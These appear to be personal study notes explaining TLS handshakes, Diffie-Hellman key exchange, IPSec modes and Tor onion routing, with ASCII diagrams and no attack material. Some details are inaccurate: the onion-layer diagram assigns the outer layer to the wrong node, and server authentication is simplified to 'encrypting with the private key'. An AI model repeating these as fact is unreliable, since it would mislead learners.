## What is a Cipher Suite?

A cipher suite is simply a **combination of algorithms** agreed upon before communication starts. Three components:

```
Example cipher suite:
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

Breaking it down:
┌─────────────────────────────────────────────┐
│ ECDHE      → Key Exchange algorithm         │
│              How to securely share keys     │
├─────────────────────────────────────────────┤
│ RSA        → Digital Signature algorithm    │
│              How to prove server identity   │
├─────────────────────────────────────────────┤
│ AES_256_GCM → Encryption algorithm         │
│               How to encrypt actual data    │
├─────────────────────────────────────────────┤
│ SHA384     → Hash algorithm                 │
│              How to verify data integrity   │
└─────────────────────────────────────────────┘
```

---

## Cipher Suite Negotiation — The TLS Handshake

This happens **before any data is sent** — at session start:

```
Step 1: CLIENT HELLO
Browser → Server
"Hello! I support these cipher suites:
→ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
→ TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
→ TLS_RSA_WITH_AES_256_CBC_SHA
I also support TLS versions 1.2 and 1.3
Here is my random number: [ClientRandom]"
```

```
Step 2: SERVER HELLO
Server → Browser
"Hello! Let's use:
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
Here is my random number: [ServerRandom]
Here is my CERTIFICATE → [certificate]"
```

```
Step 3: CERTIFICATE VERIFICATION
Browser checks certificate:
→ Is it signed by trusted CA? ✅
→ Is it expired? ✅
→ Does domain match? ✅
→ Has it been revoked? ✅
Server identity verified ✅
```

```
Step 4: KEY EXCHANGE
Browser and Server use ECDHE to:
Generate shared secret key
Without ever transmitting the key itself
(Diffie-Hellman magic we can discuss)
        ↓
Both sides now have identical session key
Never sent across network ✅
```

```
Step 5: FINISHED
Both sides confirm:
"I am ready to communicate securely"
Encrypted communication begins ✅
```

---

## How Does TLS Provide Server Authentication?

This is the certificate part — connecting back to our CA discussion:

```
When you visit https://google.com:

Step 1: Google presents its certificate
┌─────────────────────────────────────┐
│ Certificate                         │
│ Owner: google.com                   │
│ Public Key: [Google's public key]   │
│ Valid: 2024-2026                    │
│ Signed by: DigiCert (CA)            │
│ Signature: [DigiCert's signature]   │
└─────────────────────────────────────┘
```

```
Step 2: Browser verifies certificate
"Is DigiCert a trusted CA?"
Browser has built-in list of ~150 trusted CAs
DigiCert is on that list ✅
        ↓
"Is DigiCert's signature on this certificate valid?"
Browser uses DigiCert's public key to verify
Signature valid ✅
        ↓
"Does certificate say google.com?"
URL in browser = google.com
Certificate says google.com ✅
        ↓
"Is certificate expired?"
Valid until 2026 ✅
        ↓
"Server is definitely Google" ✅
```

```
Step 3: Proving server has the private key
Certificate contains Google's PUBLIC key
Anyone can have a copy of this certificate
Attacker could steal the certificate
        ↓
So browser challenges the server:
"Encrypt this random number with your private key"
        ↓
Real Google:
Has private key → encrypts it → sends back
Browser decrypts with public key from certificate
Matches ✅ → definitely Google's server
        ↓
Fake attacker:
Has certificate but NOT private key
Cannot encrypt correctly
Challenge fails ❌ → not Google
```
## Without ever transmitting the key how does it share the key- The TLS Handshake
```
Alice and Bob want to encrypt communication
They need a shared secret key
But they are communicating over the internet
Attacker is watching EVERYTHING they send
        ↓
How do you agree on a secret key
when someone is watching every message?

```
## Diffie-Hellman — The Magic Explained

The trick is using **mathematics where combining is easy but reversing is impossible.**

Let me explain with the famous **color mixing analogy** first:

```
Color mixing properties:
Easy:  mix two colors together → get new color
Hard:  look at mixed color → figure out original colors

Example:
Yellow + Blue = Green ✅ easy
Green → what made this? ❌ very hard to reverse
```

---

## Step by Step With Colors

```
Step 1: Alice and Bob agree on a PUBLIC starting color
Both know it, attacker knows it — doesn't matter
Starting color = YELLOW (public)

Step 2: Each picks a SECRET private color
Alice picks: RED   (keeps this secret)
Bob picks:   BLUE  (keeps this secret)
Attacker knows nothing about these

Step 3: Each mixes their secret with the public color
Alice: YELLOW + RED  = ORANGE  → sends ORANGE to Bob
Bob:   YELLOW + BLUE = GREEN   → sends GREEN to Alice

Attacker sees: ORANGE and GREEN being exchanged
Cannot figure out RED or BLUE from these ✅

Step 4: Each adds their secret to what they received
Alice: ORANGE + RED  = ORANGE+RED
Bob:   GREEN  + BLUE = GREEN+BLUE

MAGIC:
ORANGE+RED   = YELLOW+RED+RED   = YELLOW+2RED
GREEN+BLUE   = YELLOW+BLUE+BLUE = YELLOW+2BLUE

Wait — that's not the same yet
Let me show the REAL mathematical version
```

---

## The Real Mathematical Version

The actual math uses **modular exponentiation** not color mixing — but same principle:

```
Easy:  calculate 3^x mod 17 → straightforward
Hard:  see result, figure out x → extremely difficult
       (called the Discrete Logarithm Problem)
```

```
Step 1: Alice and Bob agree on PUBLIC numbers
p = 23  (a prime number)     ← everyone knows this
g = 5   (a base number)      ← everyone knows this
Attacker knows p and g — doesn't matter

Step 2: Each picks a PRIVATE secret number
Alice picks: a = 6    ← never shared with anyone
Bob picks:   b = 15   ← never shared with anyone

Step 3: Each calculates their PUBLIC value
Alice: A = g^a mod p = 5^6 mod 23 = 8
Bob:   B = g^b mod p = 5^15 mod 23 = 19

Step 4: They EXCHANGE public values
Alice sends: 8  → Bob
Bob sends:   19 → Alice
Attacker sees 8 and 19 — cannot reverse engineer
secret numbers 6 or 15 from these ✅

Step 5: Each calculates SHARED SECRET
Alice: B^a mod p = 19^6 mod 23 = 2
Bob:   A^b mod p = 8^15 mod 23 = 2

BOTH GET 2 ✅
Without ever sending 2 across the network
Without ever sharing their private numbers
```
---

## "Avoids Modifying TCP Stack"

This is an elegant engineering decision:

```
TCP stack = the core networking code in your OS
Deeply embedded, complex, risky to change
Millions of devices use it
        ↓
TLS designers said:
"We will NOT touch TCP at all
We will sit on TOP of TCP
Like a layer of wrapping paper around data"
```

```
Without TLS modification to TCP:
Application → TCP → Network
(would require rewriting TCP itself)

With TLS sitting between:
Application → TLS → TCP → Network
(TCP completely unchanged)
TLS just wraps data before handing to TCP
TCP has no idea TLS even exists
```

**Why this was genius:**

```
Every device already has TCP implemented
No OS updates needed for TCP
No hardware changes needed
Just add TLS library on top
        ↓
Adoption was easy:
Install TLS library ✅
Works with existing TCP ✅
Works with existing hardware ✅
Works with existing network ✅
```

---

## "Minimal App Changes"

Related to above — adding TLS to an existing app was simple:

```
Converting HTTP → HTTPS:

HTTP code:
socket.connect(server, port 80)
socket.send(data)

HTTPS code:
socket.connect(server, port 443)
tlsSocket = TLS.wrap(socket)  ← one line added
tlsSocket.send(data)          ← same as before

Literally wrapping existing connection with TLS
Application logic unchanged
Just one extra wrapping step
```

This is why HTTPS adoption was relatively fast — existing web servers needed minimal code changes.

---

## "Mostly Used to Authenticate Servers"

The slide mentions **optional client authentication** — this is interesting:

```
Server authentication (always happens):
Browser verifies server's certificate
"Is this really google.com?" ✅
Happens in every single HTTPS connection
You never notice it — automatic

Client authentication (optional, rare):
Server asks browser:
"Prove who YOU are with a certificate"
        ↓
Where is this used?
→ Corporate VPNs — employee must present certificate
→ Banking systems — high security client verification
→ Government systems — smart card certificates
→ API authentication — machine to machine
        ↓
Regular browsing:
Server never asks who you are via certificate
You authenticate via username/password AFTER
TLS connection is established
TLS itself doesn't handle that part
```
```
Why mostly server auth only?

Issuing certificates to every user:
→ Expensive
→ Complex to manage
→ Hard to revoke
→ User experience nightmare
        ↓
Easier solution:
TLS proves server identity ✅
Username/password proves user identity
Two separate mechanisms working together

```
## Full TLS Key Exchange Visualized

```
Browser                              Google Server
   │                                      │
   │──── ClientHello ────────────────────→│
   │     "I support these cipher suites"  │
   │                                      │
   │←─── ServerHello ────────────────────│
   │     "Use ECDHE + AES256 + SHA384"   │
   │     + Certificate                    │
   │                                      │
   │  Browser verifies certificate ✅     │
   │                                      │
   │  Browser generates private key b     │
   │  Calculates public value B           │
   │                                      │
   │──── ClientKeyExchange ──────────────→│
   │     Sends B (public value)           │
   │                          Server has private key a
   │                          Calculates public value A
   │←─── ServerKeyExchange ──────────────│
   │     Sends A (public value)           │
   │                                      │
   Browser calculates:    Server calculates:
   shared = A^b mod p     shared = B^a mod p
   = g^ab mod p           = g^ab mod p
   SAME RESULT ✅         SAME RESULT ✅
   │                                      │
   │══════ Encrypted with shared key ════│
   │         Communication begins         │
```

---

## ECDHE — What TLS Actually Uses

Modern TLS uses **Elliptic Curve Diffie Hellman Ephemeral (ECDHE)** — same concept but using elliptic curve mathematics instead:

```
Regular DH:    uses very large prime numbers
               needs 2048+ bits for security

ECDHE:         uses elliptic curve points
               256 bits gives equivalent security
               much faster, less computation
               "Ephemeral" = new key generated 
               for every single session
```

**Ephemeral is crucial:**

```
Regular DH:
Same private key used for many sessions
Attacker records all encrypted traffic
Later steals private key somehow
Can decrypt ALL previously recorded sessions ❌
Called "retroactive decryption"

ECDHE (Ephemeral):
New private key generated for EVERY session
Session ends → key deleted permanently
Attacker records all traffic
Later steals server's certificate private key
Cannot decrypt old sessions ✅
Each session's key is gone forever
Called "Perfect Forward Secrecy"
```
## IPSec
## 1. What is Tunneling?

Tunneling means **wrapping one packet inside another packet:**

```
Normal packet travelling internet:
┌─────────────────────────────┐
│ IP Header (source, dest)    │
│ Data (your actual content)  │
└─────────────────────────────┘

Tunneled packet:
┌──────────────────────────────────────┐
│ OUTER IP Header (tunnel endpoints)   │
│ ┌──────────────────────────────────┐ │
│ │ INNER IP Header (real source/dest)│ │
│ │ Data (your actual content)        │ │
│ └──────────────────────────────────┘ │
└──────────────────────────────────────┘
```
## Why tunneling is useful:
```
Real world example — Corporate VPN:
Employee at home wants to access office network
Home IP: 1.2.3.4
Office network: 192.168.1.0/24

Without tunnel:
Home PC sends packet to 192.168.1.50
Internet routers: "192.168.1.x? Private IP!"
"I don't know how to route this" ❌

With tunnel:
Home PC wraps packet:
Outer header: 1.2.3.4 → VPN gateway (5.6.7.8)
Inner header: 1.2.3.4 → 192.168.1.50

Internet routes outer packet to VPN gateway ✅
VPN gateway unwraps it
Delivers inner packet to 192.168.1.50 ✅
Private network accessible from anywhere ✅
```

---

## 2. What is GRE?

**Generic Routing Encapsulation** — a specific tunneling protocol:

```
GRE is the wrapper format:
┌─────────────────────────────────────┐
│ Outer IP Header                     │
├─────────────────────────────────────┤
│ GRE Header                          │
│ "This is a GRE tunnel"              │
│ "Inner packet is IPv4"              │
├─────────────────────────────────────┤
│ Inner IP Header + Data              │
└─────────────────────────────────────┘
```

**GRE's key feature — carries ANY protocol:**

```
Regular IP: can only carry IP traffic
GRE tunnel: can carry:
→ IPv4 packets ✅
→ IPv6 packets ✅
→ IPX packets ✅
→ Any network protocol ✅

Like a universal shipping container
that can carry any type of cargo
```

**GRE alone has one big problem:**

```
GRE provides tunneling ✅
GRE provides NO encryption ❌
GRE provides NO authentication ❌

Packets are wrapped but still readable
Anyone intercepting can see contents

This is why GRE + IPSec are used together:
GRE    → handles the tunneling/wrapping
IPSec  → adds encryption and authentication
Together → secure encrypted tunnel ✅
```

---

## 3. IPSec Components — AH and ESP

**Authentication Header (AH):**

```
Provides:
→ Authentication (proves who sent packet) ✅
→ Integrity (proves packet not modified) ✅
→ NO encryption ❌ (data still readable)

AH signs the entire packet:
┌─────────────────────────────────────┐
│ IP Header                           │
├─────────────────────────────────────┤
│ AH Header                           │
│ [cryptographic signature of packet] │
├─────────────────────────────────────┤
│ Data (still readable!)              │
└─────────────────────────────────────┘

Use case:
When you need to prove packet is authentic
but don't need to hide content
Government routing authentication etc.
```

**Encapsulated Security Payload (ESP):**

```
Provides:
→ Authentication ✅
→ Integrity ✅
→ Encryption ✅ (data hidden)

Much more commonly used than AH

┌─────────────────────────────────────┐
│ IP Header                           │
├─────────────────────────────────────┤
│ ESP Header                          │
├─────────────────────────────────────┤
│ Encrypted Data ← nobody can read   │
├─────────────────────────────────────┤
│ ESP Trailer + Auth signature        │
└─────────────────────────────────────┘

Most VPNs use ESP not AH
Because you usually want encryption too
```

---

## 4. What is ISAKMP Key Exchange?

**Internet Security Association and Key Management Protocol** — IPSec's version of the key exchange we discussed in TLS.

Remember Diffie-Hellman from our TLS discussion? ISAKMP uses the same concept but for IPSec:

```
ISAKMP works in TWO phases:

PHASE 1 — Build a secure channel:
"Before we can negotiate IPSec keys
 we need a safe way to communicate"
        ↓
Two routers authenticate each other:
Using pre-shared keys OR certificates
        ↓
Use Diffie-Hellman to establish
a secure encrypted channel between them
This channel = ISAKMP Security Association (SA)

PHASE 2 — Negotiate actual IPSec keys:
Now safely inside Phase 1 encrypted channel:
"What encryption do we use? AES-256?"
"What authentication? SHA-256?"
"Here are our session keys"
        ↓
IPSec tunnel established
Actual traffic can flow securely ✅
```

**Security Association (SA):**

```
SA = agreement between two endpoints about:
→ Which encryption algorithm to use
→ Which authentication algorithm
→ What keys to use
→ How long keys are valid
→ One SA per direction of traffic

Alice → Bob: SA1
Bob → Alice: SA2
Two separate SAs for bidirectional communication
```

---

## 5. Transport Mode vs Tunnel Mode

This is a crucial distinction:

**Transport Mode:**

```
Protects ONLY the payload
Original IP header left intact

Before IPSec:
┌──────────────┬──────────────────┐
│ IP Header    │ Data             │
└──────────────┴──────────────────┘

After Transport Mode:
┌──────────────┬──────────┬───────────────────┐
│ IP Header    │ESP Header│ Encrypted Data    │
│ (unchanged!) │          │                   │
└──────────────┴──────────┴───────────────────┘

Real IP addresses still visible in header
Only data is encrypted/authenticated

Used for:
Host to host communication
Both endpoints are the actual source/destination
"Secure the data between these two specific machines"
```

**Tunnel Mode:**

```
Protects ENTIRE original packet
Wraps everything in new outer packet

Before IPSec:
┌──────────────┬──────────────────┐
│ IP Header    │ Data             │
└──────────────┴──────────────────┘

After Tunnel Mode:
┌─────────────┬──────────┬────────────────────────────┐
│ NEW         │ESP Header│ Encrypted:                 │
│ IP Header   │          │ [Original IP Header + Data]│
│ (tunnel     │          │ Real IPs hidden inside ✅  │
│  endpoints) │          │                            │
└─────────────┴──────────┴────────────────────────────┘

Real IP addresses hidden inside encryption
Outside only sees tunnel endpoint IPs

Used for:
Network to network VPNs
Gateway to gateway
"Connect entire office networks together"
```

![[Pasted image 20260408222130.png]]

---

## 6. "Transparent to Application but Modifies Network Stack"

This is opposite to TLS — really important distinction:

**TLS approach (application level):**

```
Application handles encryption itself:
Browser knows about TLS
Browser code calls TLS functions
Application AWARE of encryption
Network stack unchanged
```

**IPSec approach (network level):**

```
Application knows NOTHING about IPSec:

Your browser sends normal HTTP request
"GET /index.html HTTP/1.1"
Browser has zero idea IPSec exists
        ↓
Packet goes DOWN the network stack:
Layer 7: HTTP (application — no knowledge of IPSec)
Layer 6: 
Layer 5:
Layer 4: TCP
Layer 3: IP → IPSec intercepts HERE
         Automatically encrypts/wraps packet
         Application never knew this happened
        ↓
Encrypted IPSec packet sent on network
```

**How it modifies the network stack:**

```
Normal network stack:
Application → TCP → IP → Network card → wire

IPSec modified network stack:
Application → TCP → IP → [IPSec ENGINE] → Network card → wire

IPSec engine inserted into Layer 3:
→ Intercepts all outgoing packets
→ Encrypts and authenticates them
→ Intercepts all incoming packets
→ Decrypts and verifies them
→ Applications see none of this

OS kernel modified to include IPSec:
→ New kernel modules installed
→ New routing rules added
→ Security policy database added
→ Security association database added
This is what "modifies network stack" means
```

**Why transparent to application matters:**
```
With TLS:
Every application must be TLS aware
Web browser → coded for TLS ✅
Old legacy app → must be rewritten ❌
Custom software → must add TLS support ❌

With IPSec:
Applications need ZERO modification
Old legacy app → works through IPSec ✅
Custom software → works through IPSec ✅
Even non-TCP protocols → protected ✅
"Just works" for everything on that machine
```

---

## 7. How IPSec Authenticates Network Nodes

Remember the distinction from our E2E discussion:

```
TLS/E2E  → authenticates USERS
IPSec    → authenticates MACHINES/NODES
```

**How node authentication works:**

```
Two office routers want to establish IPSec tunnel:
Router A (New York)
Router B (London)

Method 1 — Pre-shared Key:
Both routers configured with same secret key
"SuperSecretVPNKey123"
Router A: "I know the secret" → proves identity
Router B: "I know the secret" → proves identity
Simple but key management is painful
If key leaked → anyone can impersonate either router

Method 2 — Digital Certificates (like TLS):
Each router has its own certificate
Signed by company's internal CA
        ↓
Router A presents certificate:
"I am NY-Router, signed by CompanyCorp CA"
Router B verifies signature ✅
"Definitely the NY router" ✅
        ↓
Router B presents certificate:
"I am London-Router, signed by CompanyCorp CA"
Router A verifies signature ✅
Mutual authentication — both sides verified ✅
```

**What node authentication proves:**

```
"This encrypted tunnel connects to
 the legitimate London office router"
NOT a fake router set up by attacker
NOT a man in the middle
Definitely the authorized endpoint ✅
```

---

## 8. "App Still Needs User Auth"

This is a crucial limitation of IPSec:

```
IPSec authenticates the MACHINE:
"This is definitely the London office router" ✅
"This is definitely John's company laptop" ✅

IPSec says NOTHING about:
"Is the person using this laptop authorized?"
"Is this actually John or did someone steal his laptop?"
```

```
Real world scenario:
John's laptop has IPSec VPN configured
IPSec tunnel established ✅
Machine authenticated ✅
        ↓
John leaves laptop unlocked
Attacker sits down at keyboard
        ↓
IPSec still works — machine is still authenticated
Attacker has full VPN access ❌
IPSec cannot distinguish John from attacker
Both using same authenticated machine
```

```
Solution — Layer both:
IPSec  → proves machine is legitimate ✅
         "This is an authorized company laptop"
         
Username/Password → proves user is legitimate ✅
"This is specifically John using that laptop"

Two factor auth → proves even more ✅
"John, with his password, with his phone"

All three together:
→ Machine authenticated by IPSec
→ User authenticated by credentials
→ Action verified by second factor
Much stronger than any one alone
```

---

## Full Summary

```
Tunneling    = wrapping packet inside another packet
               lets private traffic cross public internet

GRE          = specific tunnel format
               carries any protocol
               no encryption alone — needs IPSec

AH           = authentication + integrity, no encryption
ESP          = authentication + integrity + encryption
               most commonly used

ISAKMP       = two phase key negotiation
               Phase 1: secure channel between endpoints
               Phase 2: negotiate actual IPSec parameters

Transport    = encrypt payload only, IPs visible
               host to host

Tunnel       = encrypt everything, IPs hidden
               network to network VPN

Transparent  = applications know nothing about IPSec
               OS network stack modified at Layer 3
               IPSec engine intercepts all packets automatically

Node auth    = proves machine identity
               pre-shared key or certificates
               NOT user identity

App needs    = IPSec proves machine
user auth      application/VPN login proves person
               both layers needed for complete security
```


### Onion Routing Concept

1. Purpose
**Prevents eavesdroppers from learning source, destination, OR content of data in transit**

2. Use Case

Evading tracking — e.g., users in oppressive countries communicating freely with the outside world

3. Asymmetric Crypto

**Uses layers of asymmetric encryption plus multiple intermediate relay hosts**

4. Key Property 1

The **exit relay (sends message to destination)** CANNOT determine the original sender.

5. Key Property 2

The **entry relay (receives from original sender)** CANNOT determine the ultimate destination.

## How Tor Works 

![[Pasted image 20260408194224.png]]

**Tor Nodes (Relays):**

```
Tor nodes = volunteer computers around the world
Regular people who install Tor relay software
Their computers become part of the Tor network
Thousands of volunteers in different countries

Three types of nodes:
┌─────────────────────────────────────────┐
│ Guard/Entry Node  → first node Alice    │
│                     connects to         │
│                     knows Alice's IP    │
│                     doesn't know dest   │
├─────────────────────────────────────────┤
│ Middle Node       → middle relay        │
│                     knows nothing about │
│                     Alice or destination│
├─────────────────────────────────────────┤
│ Exit Node         → final node          │
│                     connects to actual  │
│                     destination website │
│                     knows destination   │
│                     doesn't know Alice  │
└─────────────────────────────────────────┘
```

**Directory Server:**

```
A trusted central server that maintains:
→ List of all active Tor nodes
→ Which nodes are reliable
→ Their IP addresses
→ Their public keys

When Alice opens Tor Browser:
Tor client → asks directory server
"Give me a list of available nodes"
Directory server → sends list
Alice's client picks random path from list
```

## 2. Why is the Final Link Unencrypted?

This is a really important point. Let me explain why.

```
Alice's journey to google.com:

Alice → [Tor encryption] → Node1 → Node2 → Exit Node → google.com

Between Alice and Exit Node:
Everything encrypted in Tor layers ✅

Between Exit Node and google.com:
Tor encryption ENDS here ❌
```

**Why does Tor encryption end at the exit node?**

```
Tor encrypts the ROUTING information
"Who is talking to whom"
        ↓
But the destination server (google.com) 
is NOT part of the Tor network
It's a normal server on the regular internet
It has no idea what Tor is
It cannot decrypt Tor encryption
        ↓
Exit node must strip Tor encryption
Send plain request to google.com
Otherwise google.com cannot understand it
```

**Is this defying Tor's purpose?**

Not entirely — here's why:

```
Tor's PRIMARY purpose:
Hide WHO is making the request
→ google.com sees Exit Node's IP
→ Never sees Alice's real IP ✅
→ Alice's identity still hidden ✅

What Tor does NOT guarantee:
Encryption of content between exit node and destination

Two scenarios:
HTTP site  → exit node to site = unencrypted ❌ (red)
HTTPS site → exit node to site = TLS encrypted ✅ (green)
```

So the fix is simple:

```
Alice visits HTTPS sites through Tor:
Alice → Tor layers → Exit Node → TLS → google.com

Two separate encryption layers:
Tor encryption  → hides Alice's identity
TLS encryption  → protects content

Exit node can see Alice is going to google.com
But cannot read the content (TLS protects it)
```

```
Alice visits HTTP sites through Tor:
Alice → Tor layers → Exit Node → plain HTTP → site

Exit node can see:
→ Destination site ✅
→ Everything Alice sends/receives ❌
Exit node is a potential eavesdropper
This is why HTTP + Tor is still risky
```

## 3. Layered Encryption — The Onion Explained

```
Alice wants to reach google.com
Path chosen: Node1 → Node2 → Node3(exit)

Alice encrypts in THREE layers:
┌─────────────────────────────┐
│ Layer 3 (Node3's key)       │
│  ┌───────────────────────┐  │
│  │ Layer 2 (Node2's key) │  │
│  │  ┌─────────────────┐  │  │
│  │  │Layer1(Node1 key)│  │  │
│  │  │ actual data     │  │  │
│  │  └─────────────────┘  │  │
│  └───────────────────────┘  │
└─────────────────────────────┘
        ↓
Node1 receives:
Peels off Layer 3 using its key
Sees: "send this to Node2"
Has NO idea what's inside remaining layers
        ↓
Node2 receives:
Peels off Layer 2 using its key
Sees: "send this to Node3"
Has NO idea who sent it or what's inside
        ↓
Node3 (exit) receives:
Peels off Layer 1
Sees actual request: "get google.com"
Sends to google.com
Does NOT know it came from Alice
```

Each node only ever knows:

```
Where it came from (previous node)
Where to send it (next node)
Nothing else
```
## 4. .Onion Sites — Hidden Services

Regular Tor browsing hides **Alice's identity** but the server's identity is still known. .onion sites hide **both sides.**

**Regular website through Tor:**

```
Alice's identity → hidden ✅
google.com location → publicly known ❌
Anyone can look up google.com's IP
```

**.onion hidden service:**

```
Alice's identity → hidden ✅
Server's identity → hidden ✅
Server has no public IP
Only exists inside Tor network
Cannot be found or accessed without Tor
```

**How .onion addresses work:**

```
Normal address: google.com
.onion address: facebookwkhpilnemxj.onion

The .onion address IS the public key
of the hidden server
Cryptographically generated
Not registered anywhere
Not on regular DNS
```

**How both sides connect without knowing each other:**

```
Server sets up hidden service:
→ Picks random "rendezvous point" node in Tor
→ Advertises itself through Tor network
→ "I am reachable at this .onion address"

Alice wants to connect:
→ Tor client finds the rendezvous point
→ Both Alice and server build Tor circuits
→ They meet at the rendezvous point
→ Neither knows the other's real IP
→ All communication through Tor
```
## Understanding TOR Domain Resolution 

Remember how DNS works normally:

```
You type google.com
        ↓
Your computer asks DNS server:
"What is the IP for google.com?"
        ↓
DNS request goes out in PLAIN TEXT
        ↓
Your ISP can see:
"This person is looking up google.com"
Even before the actual connection happens
```

If Tor used normal DNS:

```
Alice uses Tor for anonymity
But DNS request leaks out before Tor:
"Alice is looking up google.com"
        ↓
DNS LEAK — anonymity completely broken
ISP knows exactly what Alice is visiting
Even though traffic goes through Tor ❌
```

## How Tor Actually Solves DNS

Tor does something clever — **DNS resolution happens at the Exit Node, not on Alice's computer:**

```
Normal browsing:
Alice's PC → DNS lookup → then connects

Tor browsing:
Alice's PC → NO DNS lookup locally
        ↓
Alice sends "google.com" (domain name)
encrypted through Tor circuit
        ↓
Exit Node receives it
Exit Node does the DNS lookup
Exit Node connects to google.com
        ↓
Alice's computer never made a DNS request
ISP never sees any DNS query from Alice ✅
```

---

## Does Tor Have Its Own DNS Server?

Not exactly a single DNS server — but here is how it works:

```
Tor does NOT run its own global DNS server
        ↓
Instead:
Each Exit Node uses its OWN DNS resolver
Whatever DNS the exit node's machine is configured with
Could be:
→ Their ISP's DNS
→ Google's 8.8.8.8
→ Cloudflare's 1.1.1.1
→ Their own local resolver
```

This means:

```
Alice's circuit: Node1 → Node2 → ExitNode (in Germany)
        ↓
DNS resolution happens from German exit node
Using German exit node's DNS server
        ↓
google.com resolves from Germany's perspective
Alice gets German IP for google.com
```

## The .onion Special Case — No DNS Needed

.onion addresses are completely different:

```
Regular domain:
google.com → needs DNS to find IP address

.onion address:
facebookwkhpilnemxj.onion → NO DNS lookup needed
        ↓
The .onion address IS the cryptographic
public key of the server
Tor network resolves it internally
Never touches the regular DNS system at all ✅
```

```
How .onion gets resolved:
Alice types facebookwkhpilnemxj.onion
        ↓
Tor client recognizes .onion suffix
"This is a hidden service — don't use DNS"
        ↓
Tor looks up the hidden service descriptor
stored distributed across Tor nodes
(like a mini internal directory)
        ↓
Finds rendezvous point
Connects entirely within Tor
DNS system never involved ✅
```

## DNS Leak — The Remaining Weakness

Even with Tor doing DNS at exit node, there is still a risk:

```
Badly configured applications:
Some apps bypass Tor and make direct DNS requests
Flash, Java, WebRTC, some plugins
        ↓
DNS request goes directly from Alice's computer
Completely bypassing Tor
ISP sees the lookup ❌
```

This is called a **DNS leak** and it's why:

```
Tor Browser → disables dangerous plugins
              forces ALL DNS through Tor circuit ✅

Brave Tor window → less strict
                   some leaks possible ❌

This is another reason real Tor Browser
is safer than Brave's Tor mode
```
https://medium.com/@alonr110/the-4-way-handshake-wpa-wpa2-encryption-protocol-65779a315a64